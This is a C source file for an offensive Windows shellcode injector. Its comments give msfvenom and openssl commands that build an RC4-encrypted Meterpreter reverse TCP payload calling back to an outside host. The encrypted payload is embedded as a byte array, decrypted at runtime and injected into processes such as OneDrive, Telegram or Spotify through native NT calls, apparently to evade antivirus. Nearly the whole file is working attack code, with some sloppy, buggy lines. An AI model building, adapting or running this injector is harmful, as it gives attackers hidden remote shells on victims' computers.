#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>

#include "syscalls_mem.h"
#include <ntstatus.h>
#include <stdbool.h>
#include <tlhelp32.h>
#include<winternl.h>

/****************************************************************************************************/
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
// cat meter.bin | openssl enc -rc4 -nosalt -k "S3cur3Th1sSh1t" > encmeter.bin
// xxd -i encmeter.bin

unsigned char encmeter_bin[] = {
  0xdf, 0x54, 0xb8, 0x88, 0x76, 0xd0, 0xb0, 0x6b, 0x71, 0x96, 0x58, 0xb1,
  0x55, 0x3a, 0xd7, 0xb4, 0xa3, 0x77, 0x0c, 0x21, 0xe3, 0xc9, 0x51, 0x12,
  0xbc, 0xbd, 0x68, 0xe1, 0x89, 0x4d, 0xbc, 0x38, 0xf4, 0x36, 0xdf, 0x83,
  0x80, 0x62, 0x60, 0x6e, 0x05, 0x07, 0xff, 0xc0, 0x0f, 0x97, 0x23, 0xe3,
  0x20, 0x02, 0x95, 0xed, 0xce, 0xe2, 0x4f, 0xd3, 0x18, 0x3d, 0xec, 0xdf,
  0x17, 0xea, 0xd0, 0x67, 0xbf, 0x83, 0x33, 0xe7, 0x7e, 0x51, 0x9a, 0xd3,
  0x4c, 0x5a, 0x8b, 0x04, 0x96, 0x7b, 0xc9, 0x2a, 0x5e, 0x9e, 0xb0, 0x50,
  0x7d, 0xe3, 0x51, 0xc7, 0x2f, 0x23, 0x5e, 0xd2, 0x83, 0xdd, 0x8e, 0x27,
  0x0a, 0xdc, 0x4d, 0x75, 0xb3, 0xe1, 0x10, 0x21, 0x8e, 0x6b, 0xc8, 0xb8,
  0x15, 0xc4, 0x79, 0xea, 0x8e, 0xf1, 0x18, 0x1c, 0xe1, 0xb3, 0x1f, 0x24,
  0x5e, 0x9a, 0xaf, 0x5f, 0x68, 0x41, 0xe3, 0x93, 0xaa, 0x76, 0xaf, 0xd7,
  0xb3, 0x13, 0x7c, 0xa7, 0x52, 0x2e, 0x3b, 0xb7, 0xfb, 0x60, 0xde, 0x93,
  0x51, 0x66, 0xc1, 0x14, 0xb8, 0xd1, 0xfe, 0x55, 0x2a, 0xb5, 0xb6, 0x20,
  0x24, 0x6e, 0x31, 0x97, 0xe8, 0x15, 0x1c, 0x6c, 0xda, 0x79, 0xb8, 0x60,
  0x21, 0x7c, 0xfe, 0x8f, 0xac, 0x19, 0xe7, 0x4c, 0xea, 0xe4, 0x64, 0xe6,
  0x4a, 0x6d, 0x6e, 0xc5, 0x38, 0x1b, 0xc7, 0x71, 0x01, 0x4b, 0x87, 0xb6,
  0x0e, 0x6f, 0x87, 0x90, 0x6e, 0x2c, 0x60, 0xe5, 0xed, 0x2d, 0xeb, 0xf5,
  0x3f, 0x7c, 0xa7, 0x99, 0xca, 0x4d, 0x0f, 0x35, 0x28, 0x36, 0x3b, 0x2f,
  0x9d, 0xd9, 0x8b, 0xac, 0x1f, 0xe7, 0x9b, 0xc9, 0x7c, 0x44, 0x3f, 0xe8,
  0x50, 0xf7, 0x71, 0x10, 0x5b, 0x70, 0x76, 0xe4, 0x81, 0xd8, 0x02, 0xe0,
  0xd3, 0x6e, 0x82, 0x05, 0x34, 0xc6, 0x33, 0xd9, 0x23, 0x9a, 0x3a, 0x09,
  0x0a, 0x7a, 0xb4, 0x7a, 0x38, 0x86, 0xcb, 0xea, 0x7b, 0x25, 0x85, 0x50,
  0x8e, 0x5c, 0xb6, 0x79, 0x98, 0xd0, 0xc9, 0x30, 0x5a, 0x97, 0x49, 0x33,
  0x49, 0x85, 0x16, 0x59, 0xdf, 0x9e, 0xb5, 0x15, 0xde, 0x79, 0x13
};
unsigned int encmeter_bin_len = 287;

/****************************************************************************************************/




int GetPIDForName(LPCSTR name)
{

    typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    
    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQuerySystemInformation)
        return 1;
    NTSTATUS Status;
    HANDLE hHeap = NULL;
    int cbBuffer = 0;
    PSYSTEM_PROCESS_INFORMATION pBuffer;
    LPVOID lpHeap;

    // Get process information buffer

        // Allocate buffer for process info

        printf("[i] Allocating a heap\n");
        lpHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0);
        if (lpHeap == 0) {
            printf("[!!!] Unable to allocate a heap\n");
            ExitProcess(-1);
        }
        else
        {
            printf("[!!!] Allocated heap\n");
        }
        /*
        pBuffer = HeapAlloc(cbBuffer, HEAP_ZERO_MEMORY, cbBuffer);
        if (pBuffer == NULL) {
            // Cannot allocate enough memory for buffer (CRITICAL ERROR)
            return 1;
        }
        */
        printf("[i] Gathering initial statistics\n");
        DWORD dwOutLength = 0;
        DWORD dwCurrentSize = 0;
        lpHeap = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpHeap, 0xFF);
        NTSTATUS ntLastStatus = NtQuerySystemInformation(5, lpHeap, 0x30, &dwOutLength); // 0x30 is smallest size you can use to get accurate output for length
        printf("[i] NTSTATUS: %I64X Required Size of heap: %I64X\n", ntLastStatus, dwOutLength);
        lpHeap = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpHeap, dwOutLength + 0x1F); // Size changes rapidly, better to have extra space
        dwCurrentSize = dwOutLength;
        ntLastStatus = NtQuerySystemInformation(5, lpHeap, dwCurrentSize, &dwOutLength); // Real call
        printf("[i] NTSTATUS: %I64X\n", ntLastStatus);

        /*
        lpHeap = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpHeap, 0xFF);
        // Obtain system process snapshot
        Status = NtQuerySystemInformation(5, lpHeap, 0x30, NULL);
        printf("Query success %d", Status);
        */
    
    // Get pointer to first system process info structure
    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)lpHeap;
    
    // Loop over each process
    for (;;) {
        // Get process name
        LPCSTR pszProcessName = pInfo->ImageName.Buffer;
        
        
        printf("\r\n\r\nProcess name is: \r\n");
        wprintf(L"%s\n",pszProcessName);


        printf("We look for: \r\n");
        wprintf(L"%s\r\n", name);


        printf("Process ID: \r\n");
        printf("%d", pInfo->UniqueProcessId);


        // I would like to compare pszProcessName with name here, but no function was able to do so - so for the moment it's hardcoded.
        if ((lstrcmpiW(pszProcessName, name) == 0))
        {

            printf("\n\n\nFound process!!!! \n\n\n");
            return pInfo->UniqueProcessId;
        }


        // ... do work. For a fast string compare, calculate a 32-bit hash of the string, then compare to a static hash.
        /*
        if (CRC32(pszProcessName) == 0xDEADBEEF ) {
            // Found process
        }
        */
        // Load next entry
        if (pInfo->NextEntryOffset == 0)
            break;
        pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo) + pInfo->NextEntryOffset);

        if (pszProcessName == name)
        {
            return pInfo->UniqueProcessId;
        }
    }
    return NULL;

}

BOOL DecryptShellcode()
{
    BOOL bSuccess = TRUE;

    HCRYPTKEY hCryptoKey;
    HCRYPTHASH hCryptHash;
    HCRYPTPROV hCryptoProv;

    DWORD dwLen = 14;
    BYTE* pbKey = "S3cur3Th1sSh1t";

    bSuccess = CryptAcquireContextW(&hCryptoProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &hCryptHash);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptHashData(hCryptHash, pbKey, dwLen, 0);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0, &hCryptoKey);
    if (!bSuccess)
    {
        goto CLEANUP;
    }
    printf("\n Decrypting \n");
    bSuccess = CryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &encmeter_bin_len);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    goto CLEANUP;

CLEANUP:
    CryptReleaseContext(hCryptoProv, 0);
    CryptDestroyKey(hCryptoKey);
    CryptDestroyHash(hCryptHash);

    return bSuccess;
}


void inject(DWORD pid) {


    DWORD oldprotect = 0;
    HANDLE thandle = NULL;
    DWORD dwPid = pid;
    LPVOID lpBuffer = NULL;
    CLIENT_ID uPid;
    HANDLE hThread;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;
    SIZE_T regionSize = (SIZE_T)sizeof(encmeter_bin);
    
    uPid.UniqueProcess = (HANDLE)dwPid;
    uPid.UniqueThread = (PVOID)0;



    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    NTSTATUS NTOP = NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &ObjectAttributes, uPid);
    
    printf("%d,", NTOP);

    NTSTATUS NTAVM = NtAllocateVirtualMemory(hProcess, &lpBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("%d,", NTAVM);

    bool success = DecryptShellcode();
    if (success)
    {
        printf("\r\nDecrypt success\r\n");
    }
    

    PSIZE_T bytesWritten = encmeter_bin_len;
    NTSTATUS NTWVM = NtWriteVirtualMemory(hProcess, lpBuffer, (PVOID)encmeter_bin, sizeof(encmeter_bin), 0);
    printf("%d,", NTWVM);
    
    
    NTSTATUS ct = NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, hProcess, lpBuffer, NULL, FALSE, 0, 0, 0, NULL);
    printf("%d,", ct);
    
    WaitForSingleObject(thandle, -1);
    free(lpBuffer);//clean up after ourselves
    
}


int main()
{
    // "targets" array length macro.
   #define MAX_TARGETS 5

    static const LPCSTR targets[] = {
                            L"notepad.exe",
                            L"OneDrive.exe",
                            L"Telegram.exe",
                            L"Messenger.exe",
                            L"Spotify.exe"
    };

    for (size_t i = 0; i < 5; i++) {

        printf("We look for: \r\n");
        wprintf(L"%s\r\n", targets[i]);
        Sleep(1000);
        int pid = GetPIDForName(targets[i]);
        if (pid != NULL)
        {
            inject(pid);
            return 0;
        }
        
    }
}
